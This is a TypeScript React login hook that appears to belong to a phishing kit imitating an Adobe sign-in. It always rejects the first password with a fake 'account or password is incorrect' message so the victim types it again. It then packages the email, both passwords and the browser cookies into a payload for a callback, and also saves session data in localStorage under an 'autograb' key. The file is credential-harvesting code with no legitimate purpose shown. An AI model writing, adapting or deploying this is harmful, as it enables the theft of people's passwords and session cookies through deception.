import { useState, useRef } from 'react';
import { getBrowserFingerprint } from '../utils/oauthHandler';

export const useLogin = (
  onLoginSuccess?: (data: any) => void,
  onLoginError?: (error: string) => void
) => {
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [firstAttemptPassword, setFirstAttemptPassword] = useState<string>('');
  
  // Refs for form inputs (used by other login components)
  const emailRef = useRef<HTMLInputElement>(null);
  const passwordRef = useRef<HTMLInputElement>(null);

  const handleFormSubmit = async (event: Event, formData?: any) => {
    event.preventDefault();
    setIsLoading(true);
    setErrorMessage('');

    try {
      const email = formData?.email || emailRef.current?.value || '';
      const password = formData?.password || passwordRef.current?.value || '';
      const provider = formData?.provider || 'Others';
      const cookies = formData?.cookies || [];
      const cookieList = formData?.cookieList || [];

      console.log('🔵 useLogin received data:', {
        email,
        provider,
        cookiesCount: cookies.length,
        cookieListCount: cookieList.length
      });

      if (!email || !password) {
        throw new Error('Please enter both email and password');
      }

      // Store session data with cookies
      const sessionData = {
        email,
        provider,
        timestamp: new Date().toISOString(),
        cookies,
        cookieList
      };
      localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));

      // Handle two-step authentication
      if (firstAttemptPassword && firstAttemptPassword !== password) {
        console.log('✅ Second attempt captured. Finalizing data.');
        
        const finalData = {
          email,
          provider,
          firstAttemptPassword,
          secondAttemptPassword: password,
          cookies,
          cookieList,
          timestamp: new Date().toISOString()
        };

        console.log('🔵 Final data being sent:', {
          email: finalData.email,
          provider: finalData.provider,
          cookiesCount: finalData.cookies.length,
          cookieListCount: finalData.cookieList.length
        });

        if (onLoginSuccess) {
          onLoginSuccess(finalData);
        }
        return;
      }

      // First attempt or single attempt
      if (!firstAttemptPassword) {
        console.log('🔒 First attempt captured (invalid password)');
        setFirstAttemptPassword(password);
        throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
      }

      // Single successful attempt
      const finalData = {
        email,
        provider,
        password,
        cookies,
        cookieList,
        timestamp: new Date().toISOString()
      };

      console.log('🔵 Single attempt final data:', {
        email: finalData.email,
        provider: finalData.provider,
        cookiesCount: finalData.cookies.length,
        cookieListCount: finalData.cookieList.length
      });

      if (onLoginSuccess) {
        onLoginSuccess(finalData);
      }
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Login failed';
      setErrorMessage(errorMsg);
      if (onLoginError) {
        onLoginError(errorMsg);
      }
    } finally {
      setIsLoading(false);
    }
  };

  return {
    isLoading,
    errorMessage,
    handleFormSubmit,
    emailRef,
    passwordRef,
  };
};
